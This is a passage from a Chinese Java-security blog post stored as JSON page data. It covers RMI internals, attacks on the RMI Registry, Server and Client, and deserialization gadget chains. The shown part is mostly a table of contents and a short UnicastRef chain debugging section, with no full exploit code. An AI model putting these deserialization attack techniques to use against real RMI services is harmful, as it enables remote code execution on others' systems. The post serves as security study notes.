punctuation\">&#125;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>dataOutputStream <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                dataOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"UnicastRef链调试：\"><a href=\"#UnicastRef链调试：\" class=\"headerlink\" title=\"UnicastRef链调试：\"></a>UnicastRef链调试：</h4><p>UnicastRef父类RemoteRef继承了Externalizable。序列化和反序列化的时候调用writeExternal和readExternal方法。</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699789905786-9ce7f5ff-7138-4974-90f5-1750a875cd51.png\" alt=\"img\"></p>\n<p>我们跟进代码看下。writeExternal将ref写进去，然后readExternal的时候将ref恢复出，但是readExternal的时候，调用了这个方法。</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699790044392-f2d4666c-3506-4880-8d94-219e2b058be2.png\" alt=\"img\"></p>\n<p>所以我们需要关注一下ep是如何来的，跟进之后我们发现了，writeExternal将host和port写入，然后readExternal的时候将其读取出来，并封装到TcpEndpoint。</p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699790197513-eac1dd11-26d7-4b70-b300-3370104f4b96.png\" alt=\"img\"></p>\n<p><img src=\"https://q16g-image.oss-cn-beijing.aliyuncs.com/1699790143353-639166c2-6151-4a36-80e9-1ef11b448472.png\" alt=\"img\"></p>\n","feature":true,"text":"RMI基础是什么？RMI是远程方法调用，是基于注册中心和服务来进行实现的，是非常类似于GO中的RPC，都可以用来做微服务。 如何用？ 定义接口继承Remote 其中的方法都需要throws RemoteException 实现类继承UnicastRemoteObject类实现接口...","link":"","photos":[],"count_time":{"symbolsCount":"11k","symbolsTime":"10 mins."},"categories":[],"tags":[{"name":"JAVA安全","slug":"JAVA安全","count":4,"path":"api/tags/JAVA安全.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#RMI%E5%9F%BA%E7%A1%80\"><span class=\"toc-text\">RMI基础</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F\"><span class=\"toc-text\">是什么？</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%A6%82%E4%BD%95%E7%94%A8%EF%BC%9F\"><span class=\"toc-text\">如何用？</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E9%97%AE%E9%A2%981%EF%BC%9A%E5%BF%85%E9%A1%BBthrows-RemoteException%E5%98%9B%EF%BC%9F%E6%8D%A2%E5%8F%A5%E8%AF%9D%E8%AF%B4throws%E5%85%B6%E4%BB%96%E7%9A%84Exceptions%E7%B1%BB%E5%9E%8B%E6%98%AF%E5%90%A6%E5%8F%AF%E4%BB%A5%EF%BC%9F\"><span class=\"toc-text\">问题1：必须throws RemoteException嘛？换句话说throws其他的Exceptions类型是否可以？</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E7%8E%B0Demo%EF%BC%9A\"><span class=\"toc-text\">实现Demo：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%8E%A5%E5%8F%A3%EF%BC%9A\"><span class=\"toc-text\">接口：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E7%8E%B0%E7%B1%BB%EF%BC%9A\"><span class=\"toc-text\">实现类：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%9C%8D%E5%8A%A1%E7%AB%AF%EF%BC%9A\"><span class=\"toc-text\">服务端：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%AE%A2%E6%88%B7%E7%AB%AF%EF%BC%9A\"><span class=\"toc-text\">客户端：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#RMI%E6%B5%81%E7%A8%8B%EF%BC%9A\"><span class=\"toc-text\">RMI流程：</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%EF%BC%9A\"><span class=\"toc-text\">攻击方法：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%89%93RMI-Registry\"><span class=\"toc-text\">打RMI Registry</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86%EF%BC%9A\"><span class=\"toc-text\">原理：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%9D%A1%E4%BB%B6%EF%BC%9A\"><span class=\"toc-text\">条件：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%E5%AE%A2%E6%88%B7%E7%AB%AF%EF%BC%9A-1\"><span class=\"toc-text\">客户端：</span></a></li><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#%E6%9C%8D%E5%8A%A1%E7%AB%AF%EF%BC%9A-1\"><span class=\"toc-text\">服务端：</span></a></li></ol></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#poc%EF%BC%9A\"><span class=\"toc-text\">poc：</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%89%93RMI-Server\"><span class=\"toc-text\">打RMI Server</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%951%EF%BC%9A\"><span class=\"toc-text\">方法1：</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%89%93RMI-Client\"><span class=\"toc-text\">打RMI Client</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E7%82%B91%EF%BC%9A%E8%BF%94%E5%9B%9E%E6%81%B6%E6%84%8F%E7%9A%84Remote%E5%AF%B9%E8%B1%A1%EF%BC%88%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%EF%BC%89\"><span class=\"toc-text\">漏洞点1：返回恶意的Remote对象（注册中心）</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E7%82%B92%EF%BC%9A%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%BF%94%E5%9B%9E%E5%80%BC%E6%98%AF%E6%81%B6%E6%84%8F%E7%9A%84Object\"><span class=\"toc-text\">漏洞点2：服务端返回值是恶意的Object</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%80%9A%E8%BF%87DGC%E6%9D%A5%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB%EF%BC%9A\"><span class=\"toc-text\">通过DGC来进行攻击：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F-1\"><span class=\"toc-text\">是什么？</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%A6%82%E4%BD%95%E7%94%A8%EF%BC%9F-1\"><span class=\"toc-text\">如何用？</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84Gadgets\"><span class=\"toc-text\">反序列化的Gadgets</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#UnicastRemoteObject%E9%93%BE%E8%B0%83%E8%AF%95\"><span class=\"toc-text\">UnicastRemoteObject链调试</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E8%B0%83%E7%94%A8%E6%A0%88%EF%BC%9A\"><span class=\"toc-text\">调用栈：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-6\"><a class=\"toc-link\" href=\"#UnicastRemoteObject%E9%93%BEpoc\"><span class=\"toc-text\">UnicastRemoteObject链poc</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#UnicastRef%E9%93%BE%E8%B0%83%E8%AF%95%EF%BC%9A\"><span class=\"toc-text\">UnicastRef链调试：</span></a></li></ol></li></ol></li></ol></li></ol>","author":{"name":"Q16G","slug":"blog-author","avatar":"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20230925201943513.png","link":"/","description":"一个潜心学习网络安全的大学生","socials":{"github":"https://github.com/Q16G","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_57222016?spm=1018.2226.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{},"next_post":{"title":"CC链全复现","uid":"3ce6a1cf6cf3e87cabf9ded16817fbf9","slug":"CC链全复现","date":"2023-09-24T10:51:05.000Z","updated":"2023-09-26T15:07:06.423Z","comments":true,"path":"api/articles/CC链全复现.json","keywords":null,"cover":null,"text":"前言其实学习CC也学了一段时间了，这里来进行全部的复现，方便自己后期直接拿过来用，也方便自己去记录和学习。 CC1：请看JAVA的CC1复现： CC6:LazyMap::getpublic Object get(Object key) &#123; // create value...","link":"","photos":[],"count_time":{"symbolsCount":"14k","symbolsTime":"13 mins."},"categories":[],"tags":[{"name":"JAVA安全","slug":"JAVA安全","count":4,"path":"api/tags/JAVA安全.json"}],"author":{"name":"Q16G","slug":"blog-author","avatar":"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20230925201943513.png","link":"/","description":"一个潜心学习网络安全的大学生","socials":{"github":"https://github.com/Q16G","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_57222016?spm=1018.2226.3001.5343","juejin":"","customs":{}}},"feature":true}}